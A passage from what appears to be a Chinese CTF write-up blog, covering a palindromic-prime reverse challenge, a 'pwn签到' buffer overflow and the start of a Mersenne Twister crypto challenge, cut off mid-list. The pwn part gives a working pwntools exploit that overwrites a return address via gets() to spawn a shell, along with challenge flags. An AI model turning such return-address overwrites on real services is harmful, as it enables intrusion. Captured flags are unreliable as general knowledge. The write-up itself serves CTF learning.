class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>素数判定函数。</p><p>进入h函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">h</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = a1;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( v2 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v2 /= <span class="hljs-number">10</span>;<br>    ++v4;<br>  &#125;<br>  v3 = a1;<br>  <span class="hljs-keyword">while</span> ( v3 )<br>  &#123;<br>    v5 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 / <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)));<br>    v6 = v3 % <span class="hljs-number">10</span>;<br>    v3 = (<span class="hljs-type">int</span>)((<span class="hljs-type">double</span>)v3 - <span class="hljs-built_in">pow</span>(<span class="hljs-number">10.0</span>, (<span class="hljs-type">double</span>)(v4 - <span class="hljs-number">1</span>)) * (<span class="hljs-type">double</span>)v5) / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> ( v5 != v6 )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    v4 -= <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断这个数是不是一个回文数。</p><p>所以这个数有三个条件，他是一个回文素数，同时他的所有位之和为58。接下来写个脚本来跑。为了时间上能更快，我们先生成回文数，在判断这个数是不是素数，再判断和是否为58。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> sympy<br><br><span class="hljs-comment"># 位数之和为58</span><br><span class="hljs-comment"># 是一个素数</span><br><span class="hljs-comment"># 是一个回文数</span><br><span class="hljs-comment"># 如果位数之和为58至少需要6位，一个int有10位，所以可选的部分位6,7,8,9,10位</span><br>Palind = []<br><br><span class="hljs-comment"># 6 位 回文数</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            temp = <span class="hljs-number">100001</span>*n+<span class="hljs-number">10010</span>*m+<span class="hljs-number">1100</span>*k<br>            <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                Palind.append(temp)<br><span class="hljs-comment"># 7位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">1000001</span>*n+<span class="hljs-number">100010</span>*m+<span class="hljs-number">10100</span>*k+<span class="hljs-number">1000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 8位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                temp = <span class="hljs-number">10000001</span>*n+<span class="hljs-number">1000010</span>*m+<span class="hljs-number">100100</span>*k+<span class="hljs-number">11000</span>*p<br>                <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                    Palind.append(temp)<br><span class="hljs-comment"># 9位</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                    temp = <span class="hljs-number">100000001</span>*n+<span class="hljs-number">10000010</span>*m+<span class="hljs-number">1000100</span>*k+<span class="hljs-number">101000</span>*p+<span class="hljs-number">10000</span>*q<br>                    <span class="hljs-keyword">if</span> sympy.isprime(temp):<br>                        Palind.append(temp)<br>                    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Palind:<br>    mydigit = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>,<span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>(i)))))<br>    <span class="hljs-keyword">if</span> mydigit == <span class="hljs-number">58</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>跑完之后有很多结果。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">9888889</span><br><span class="hljs-number">9896989</span><br><span class="hljs-number">9978799</span><br><span class="hljs-number">178989871</span><br><span class="hljs-number">179969971</span><br><span class="hljs-number">188888881</span><br><span class="hljs-number">189787981</span><br>...<br>...<br>...<br></code></pre></td></tr></table></figure><p>回到提示信息，三个密码只有一个是正确的。在我们的输出结果中，七位的满足要求的数只有三个，猜测可能就是这三个其中的一个。</p><p>尝试了一下第一个数，发现就是flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>: ctfshow&#123;<span class="hljs-number">9888889</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="pwn签到"><a class="markdownIt-Anchor" href="#pwn签到"></a> pwn签到</h2><p>IDA打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(byte_8048668);<br>  dsb(&amp;argc);<br>  <span class="hljs-built_in">puts</span>(asc_8048694);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入dsb。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">dsb</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br><br>  gets(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里一个溢出漏洞。函数列表中有一个shell_here函数。所以我们直接用shell_here的地址盖返回地址就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br><span class="hljs-keyword">import</span> pwn<br><br>r = pwn.remote(<span class="hljs-string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="hljs-number">28175</span>)<br>r.send(<span class="hljs-string">b&quot;\xf6\x84\x04\x08&quot;</span>*<span class="hljs-number">6</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># ctfshow&#123;19d0be7b-3f2d-48e6-a8f6-186af1f41177&#125;</span><br></code></pre></td></tr></table></figure><div class="note note-info">            <p>于2022-06-09新增</p>          </div><p>官方的writeup也出来了：</p><p><a href="https://ctf-show.feishu.cn/docs/doccntPffNO3VIF0LV6087Nzbnc#">https://ctf-show.feishu.cn/docs/doccntPffNO3VIF0LV6087Nzbnc#</a></p><p>有些题我看writeup都觉得难，这那适合新手了？</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>PWN</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022DASCTF MAY 出题人挑战赛</title>
    <link href="/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2022/05/21/2022DASCTF-MAY-%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022DASCTF MAY 出题人挑战赛中 Yusa的密码学课堂——一见如故 的题解。</p><span id="more"></span><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h2><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myrand</span>():<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed</span>):<br>self.index = <span class="hljs-number">0</span><br>self.isInit = <span class="hljs-number">1</span><br>self.MT = [seed] + [<span class="hljs-number">0</span>] * <span class="hljs-number">623</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">624</span>):<br>t = <span class="hljs-number">1314433253</span> * (self.MT[i-<span class="hljs-number">1</span>] ^ (self.MT[i-<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">30</span>)) + <span class="hljs-number">1</span><br>self.MT[i] = t &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>y = (self.MT[i] &amp; <span class="hljs-number">0x80000000</span>) + (self.MT[(i+<span class="hljs-number">1</span>)%<span class="hljs-number">624</span>] &amp; <span class="hljs-number">0x7fffffff</span>)<br>self.MT[i] = self.MT[(i+<span class="hljs-number">397</span>)%<span class="hljs-number">624</span>] ^ (y &gt;&gt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> y &amp; <span class="hljs-number">1</span>:<br>self.MT[i] ^= <span class="hljs-number">2567483520</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rand</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">if</span> self.index == <span class="hljs-number">0</span>:<br>self.generate()<br>y = self.MT[self.index]<br>y = y ^ self.cs2l(y, <span class="hljs-number">11</span>) ^ self.cs2l(y,<span class="hljs-number">15</span>)<br>y = y ^ self.cs2r(y,<span class="hljs-number">7</span>) ^ self.cs2r(y,<span class="hljs-number">19</span>)<br>self.index = (self.index + <span class="hljs-number">1</span>) % <span class="hljs-number">624</span><br><span class="hljs-keyword">return</span> y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2l</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cs2r</span>(<span class="hljs-params">self, y, shift</span>):<br><span class="hljs-keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xffffffff</span><br><br><span class="hljs-keyword">import</span> os<br>r = Myrand(<span class="hljs-built_in">int</span>(os.urandom(<span class="hljs-number">4</span>).<span class="hljs-built_in">hex</span>(),<span class="hljs-number">16</span>))<br>out = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>out.append(r.rand())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(<span class="hljs-built_in">str</span>(out))<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>flag = <span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="hljs-built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>文件里面是输出的rand数。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">[<span class="hljs-number">3417500333</span>, <span class="hljs-number">4091726338</span>, <span class="hljs-number">652603332</span>, <span class="hljs-number">4187304543</span>, <span class="hljs-number">4293795290</span>, <span class="hljs-number">1622245003</span>, <span class="hljs-number">3383443782</span>, <span class="hljs-number">2420250331</span>, <span class="hljs-number">322010852</span>, <span class="hljs-number">1604005753</span>, <span class="hljs-number">3137930218</span>, <span class="hljs-number">1074571824</span>, <span class="hljs-number">1566336258</span>, <span class="hljs-number">2754341076</span>, <span class="hljs-number">1059426660</span>, <span class="hljs-number">2461569360</span>, <span class="hljs-number">613134153</span>, <span class="hljs-number">860561774</span>, <span class="hljs-number">3003069274</span>, <span class="hljs-number">553387944</span>, <span class="hljs-number">1949778231</span>, <span class="hljs-number">249886857</span>, <span class="hljs-number">2322866121</span>, <span class="hljs-number">3685855175</span>, <span class="hljs-number">1977923546</span>, <span class="hljs-number">1887238269</span>, <span class="hljs-number">253812990</span>, <span class="hljs-number">2188417674</span>, <span class="hljs-number">2718707711</span>, <span class="hljs-number">1599975569</span>, <span class="hljs-number">3254935456</span>, <span class="hljs-number">3199641169</span>, <span class="hljs-number">362166522</span>, <span class="hljs-number">1378687155</span>, <span class="hljs-number">912036995</span>, <span class="hljs-number">3174049018</span>, <span class="hljs-number">780042016</span>, <span class="hljs-number">970421905</span>, <span class="hljs-number">3468971406</span>, <span class="hljs-number">801660807</span>, <span class="hljs-number">833926127</span>, <span class="hljs-number">473587885</span>, <span class="hljs-number">158979812</span>, <span class="hljs-number">405306558</span>, <span class="hljs-number">1363084996</span>, <span class="hljs-number">2023076543</span>, <span class="hljs-number">2069797730</span>, <span class="hljs-number">718155249</span>, <span class="hljs-number">1641186127</span>, <span class="hljs-number">3616747747</span>, <span class="hljs-number">1575693921</span>, <span class="hljs-number">3856591855</span>, <span class="hljs-number">223881884</span>, <span class="hljs-number">3002184567</span>, <span class="hljs-number">1666647440</span>, <span class="hljs-number">617661934</span>, <span class="hljs-number">2673101022</span>, <span class="hljs-number">885332395</span>, <span class="hljs-number">3391329168</span>, <span class="hljs-number">1640225363</span>, <span class="hljs-number">2565685644</span>, <span class="hljs-number">3892963352</span>, <span class="hljs-number">3034627488</span>, <span class="hljs-number">2415435183</span>, <span class="hljs-number">3648712566</span>, <span class="hljs-number">2140877952</span>, <span class="hljs-number">1303506086</span>, <span class="hljs-number">2455662362</span>, <span class="hljs-number">1720382700</span>, <span class="hljs-number">3970268445</span>, <span class="hljs-number">2579167586</span>, <span class="hljs-number">4117229324</span>, <span class="hljs-number">846645263</span>, <span class="hljs-number">3252991293</span>, <span class="hljs-number">79067029</span>, <span class="hljs-number">2756800392</span>, <span class="hljs-number">2212447526</span>, <span class="hljs-number">2203329967</span>, <span class="hljs-number">1270408703</span>, <span class="hljs-number">740176928</span>, <span class="hljs-number">3176125705</span>, <span class="hljs-number">166800854</span>, <span class="hljs-number">3327343902</span>, <span class="hljs-number">2079714725</span>, <span class="hljs-number">3702269956</span>, <span class="hljs-number">3659849279</span>, <span class="hljs-number">3658666909</span>, <span class="hljs-number">797535816</span>, <span class="hljs-number">600857570</span>, <span class="hljs-number">553836307</span>, <span class="hljs-number">2394740468</span>, <span class="hljs-number">1178393549</span>, <span class="hljs-number">2183765310</span>, <span class="hljs-number">4014432190</span>, <span class="hljs-number">652246726</span>, <span class="hljs-number">3693235932</span>, <span class="hljs-number">4046942361</span>, <span class="hljs-number">4105444828</span>, <span class="hljs-number">145386213</span>, <span class="hljs-number">1198390220</span>, <span class="hljs-number">3023119098</span>, <span class="hljs-number">663559283</span>, <span class="hljs-number">225958361</span>, <span class="hljs-number">3893000878</span>, <span class="hljs-number">1615631644</span>, <span class="hljs-number">1941951859</span>, <span class="hljs-number">471085675</span>, <span class="hljs-number">2164362049</span>, <span class="hljs-number">4274234562</span>, <span class="hljs-number">4127314557</span>, <span class="hljs-number">1833529303</span>, <span class="hljs-number">17668093</span>, <span class="hljs-number">3208743142</span>, <span class="hljs-number">3210135945</span>, <span class="hljs-number">1772990736</span>, <span class="hljs-number">3290157875</span>, <span class="hljs-number">3006334453</span>, <span class="hljs-number">3831748800</span>, <span class="hljs-number">1120411838</span>, <span class="hljs-number">690279329</span>, <span class="hljs-number">2436940844</span>, <span class="hljs-number">1440602808</span>, <span class="hljs-number">1552272917</span>, <span class="hljs-number">1321728089</span>, <span class="hljs-number">524486126</span>, <span class="hljs-number">3696307959</span>, <span class="hljs-number">1189129368</span>, <span class="hljs-number">28736041</span>, <span class="hljs-number">3143264315</span>, <span class="hljs-number">3050323849</span>, <span class="hljs-number">1458456612</span>, <span class="hljs-number">389869312</span>, <span class="hljs-number">2360130428</span>, <span class="hljs-number">854837117</span>, <span class="hljs-number">1270423403</span>, <span class="hljs-number">3471650414</span>, <span class="hljs-number">243573262</span>, <span class="hljs-number">3449929772</span>, <span class="hljs-number">2436299611</span>, <span class="hljs-number">420972940</span>, <span class="hljs-number">923873821</span>, <span class="hljs-number">3499748829</span>, <span class="hljs-number">2470333529</span>, <span class="hljs-number">3901870125</span>, <span class="hljs-number">3589884387</span>, <span class="hljs-number">3339475693</span>, <span class="hljs-number">1526947412</span>, <span class="hljs-number">1747516667</span>, <span class="hljs-number">2971536797</span>, <span class="hljs-number">273910310</span>, <span class="hljs-number">2185887289</span>, <span class="hljs-number">2723697010</span>, <span class="hljs-number">1973585459</span>, <span class="hljs-number">1166325256</span>, <span class="hljs-number">1360822059</span>, <span class="hljs-number">416514510</span>, <span class="hljs-number">4038763765</span>, <span class="hljs-number">1816380840</span>, <span class="hljs-number">940152644</span>, <span class="hljs-number">3918708431</span>, <span class="hljs-number">3410593321</span>, <span class="hljs-number">3358844522</span>, <span class="hljs-number">3678637784</span>, <span class="hljs-number">2412834780</span>, <span class="hljs-number">3052967117</span>, <span class="hljs-number">3672611162</span>, <span class="hljs-number">570069042</span>, <span class="hljs-number">95771608</span>, <span class="hljs-number">1210821251</span>, <span class="hljs-number">2163778365</span>, <span class="hljs-number">2739972546</span>, <span class="hljs-number">3094346015</span>, <span class="hljs-number">749719666</span>, <span class="hljs-number">1697477587</span>, <span class="hljs-number">986142486</span>, <span class="hljs-number">2591897292</span>, <span class="hljs-number">1234948693</span>, <span class="hljs-number">3659791160</span>, <span class="hljs-number">3990257960</span>, <span class="hljs-number">501199958</span>, <span class="hljs-number">3029961497</span>, <span class="hljs-number">578415668</span>, <span class="hljs-number">124517322</span>, <span class="hljs-number">1985205894</span>, <span class="hljs-number">3777347400</span>, <span class="hljs-number">1149995545</span>, <span class="hljs-number">290699775</span>, <span class="hljs-number">3399696193</span>, <span class="hljs-number">1062094395</span>, <span class="hljs-number">2896523484</span>, <span class="hljs-number">1562688856</span>, <span class="hljs-number">992098141</span>, <span class="hljs-number">3941170280</span>, <span class="hljs-number">262596967</span>, <span class="hljs-number">2585751001</span>, <span class="hljs-number">3682611205</span>, <span class="hljs-number">530523926</span>, <span class="hljs-number">1202322766</span>, <span class="hljs-number">3777439514</span>, <span class="hljs-number">3051700271</span>, <span class="hljs-number">261632458</span>, <span class="hljs-number">2736123960</span>, <span class="hljs-number">2786338595</span>, <span class="hljs-number">86310784</span>, <span class="hljs-number">2760191516</span>, <span class="hljs-number">1344514731</span>, <span class="hljs-number">350767781</span>, <span class="hljs-number">2858876127</span>, <span class="hljs-number">519088864</span>, <span class="hljs-number">3193340756</span>, <span class="hljs-number">3563489312</span>, <span class="hljs-number">3239917298</span>, <span class="hljs-number">161418824</span>, <span class="hljs-number">470724403</span>, <span class="hljs-number">3310407387</span>, <span class="hljs-number">1743713887</span>, <span class="hljs-number">3064036770</span>, <span class="hljs-number">1175434157</span>, <span class="hljs-number">3029464330</span>, <span class="hljs-number">116086349</span>, <span class="hljs-number">1652489862</span>, <span class="hljs-number">1176236897</span>, <span class="hljs-number">4139800383</span>, <span class="hljs-number">3758499033</span>, <span class="hljs-number">2961626313</span>, <span class="hljs-number">3064683859</span>, <span class="hljs-number">958478146</span>, <span class="hljs-number">596650527</span>, <span class="hljs-number">1000277312</span>, <span class="hljs-number">4102368994</span>, <span class="hljs-number">1480011430</span>, <span class="hljs-number">4001401502</span>, <span class="hljs-number">4004287177</span>, <span class="hljs-number">3202905309</span>, <span class="hljs-number">1754655955</span>, <span class="hljs-number">2064262245</span>, <span class="hljs-number">1840530874</span>, <span class="hljs-number">2284428117</span>, <span class="hljs-number">2281854453</span>, <span class="hljs-number">1023839768</span>, <span class="hljs-number">2166517711</span>, <span class="hljs-number">2709857675</span>, <span class="hljs-number">2005014414</span>, <span class="hljs-number">4161461001</span>, <span class="hljs-number">2932436148</span>, <span class="hljs-number">2411599350</span>, <span class="hljs-number">4267437788</span>, <span class="hljs-number">2132764972</span>, <span class="hljs-number">150665266</span>, <span class="hljs-number">286170947</span>, <span class="hljs-number">2249288787</span>, <span class="hljs-number">3953585886</span>, <span class="hljs-number">1231725143</span>, <span class="hljs-number">2479045931</span>, <span class="hljs-number">2377059462</span>, <span class="hljs-number">281316188</span>, <span class="hljs-number">379113422</span>, <span class="hljs-number">920019004</span>, <span class="hljs-number">163289886</span>, <span class="hljs-number">2210874762</span>, <span class="hljs-number">1578529538</span>, <span class="hljs-number">309521495</span>, <span class="hljs-number">3737017316</span>, <span class="hljs-number">88919917</span>, <span class="hljs-number">559742618</span>, <span class="hljs-number">978230553</span>, <span class="hljs-number">2154491496</span>, <span class="hljs-number">994913727</span>, <span class="hljs-number">498894258</span>, <span class="hljs-number">1355546448</span>, <span class="hljs-number">4023836881</span>, <span class="hljs-number">3014313787</span>, <span class="hljs-number">164044564</span>, <span class="hljs-number">2408825840</span>, <span class="hljs-number">2029992558</span>, <span class="hljs-number">3707778216</span>, <span class="hljs-number">86206872</span>, <span class="hljs-number">3576935874</span>, <span class="hljs-number">185356787</span>, <span class="hljs-number">1774175910</span>, <span class="hljs-number">3145237900</span>, <span class="hljs-number">3497547609</span>, <span class="hljs-number">841914878</span>, <span class="hljs-number">3425254534</span>, <span class="hljs-number">4264030778</span>, <span class="hljs-number">2348022032</span>, <span class="hljs-number">178331591</span>, <span class="hljs-number">943923822</span>, <span class="hljs-number">3384367749</span>, <span class="hljs-number">2806712599</span>, <span class="hljs-number">1178535099</span>, <span class="hljs-number">1251085540</span>, <span class="hljs-number">2410015803</span>, <span class="hljs-number">1480595408</span>, <span class="hljs-number">2732607876</span>, <span class="hljs-number">1579706357</span>, <span class="hljs-number">870791724</span>, <span class="hljs-number">2320512780</span>, <span class="hljs-number">2149666862</span>, <span class="hljs-number">3797999384</span>, <span class="hljs-number">3905363134</span>, <span class="hljs-number">3388169321</span>, <span class="hljs-number">851973359</span>, <span class="hljs-number">1418716205</span>, <span class="hljs-number">207581030</span>, <span class="hljs-number">1740441523</span>, <span class="hljs-number">1173839013</span>, <span class="hljs-number">4280610104</span>, <span class="hljs-number">1769134281</span>, <span class="hljs-number">1758916333</span>, <span class="hljs-number">4061069248</span>, <span class="hljs-number">2147554262</span>, <span class="hljs-number">2749007447</span>, <span class="hljs-number">909878569</span>, <span class="hljs-number">2054562584</span>, <span class="hljs-number">1515003000</span>, <span class="hljs-number">560286390</span>, <span class="hljs-number">2482663802</span>, <span class="hljs-number">2690882951</span>, <span class="hljs-number">3298162668</span>, <span class="hljs-number">2561737261</span>, <span class="hljs-number">167825221</span>, <span class="hljs-number">507375343</span>, <span class="hljs-number">2179952491</span>, <span class="hljs-number">795452860</span>, <span 